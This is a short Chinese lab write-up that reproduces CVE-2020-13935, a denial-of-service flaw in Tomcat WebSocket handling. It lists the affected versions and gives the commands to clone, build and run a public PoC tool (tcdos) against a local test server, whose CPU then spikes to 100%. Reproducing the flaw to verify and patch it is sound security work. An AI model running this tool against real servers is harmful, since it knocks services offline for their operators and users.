# 0x00 软件介绍
Tomcat：一款流行的java web应用服务器

# 0x01 复现环境
使用环境：本地搭建的环境  
复现版本：apache-tomcat-8.5.56

# 0x02 环境搭建
靶机系统：2008_r2_standard_zh-chs  
下载并解压apache-tomcat-8.5.56  
进入目录bin并执行startup.bat，出现下图所示“Server startup in xx ms”通常表示启动成功  
![image](./a.png)  
访问http://172.16.35.133:8080/ 如下图，确认服务启动成功  
![image](./b.png)

# 0x03 利用条件
Tomcat上部署了WebSocket应用，如examples/websocket

# 0x04 影响版本
9.0.0.M1 <= apache tomcat <= 9.0.36
10.0.0-M1 <= apache tomcat <= 10.0.0-M6
8.5.0 <= apache tomcat <= 8.5.56
7.0.27 <= apache tomcat <= 7.0.104

# 0x05 漏洞复现
攻击系统：Kali-Linux-2020.2-vmware-amd64  
执行如下命令：  
git clone https://github.com/RedTeamPentesting/CVE-2020-13935  
cd CVE-2020-13935  
go build  
./tcdos ws://172.16.35.133:8080/examples/websocket/echoProgrammatic  
执行后靶机系统CPU骤升到100%，如下图  
![image](./c.png)

# 0x06 踩坑记录
坑1：  
执行go build后，可能会报如下错误  
![image](./d.png)  
此时需要一些合理上网方式，成功执行后如下图  
![image](./e.png)  

# 0x07 参考链接
无
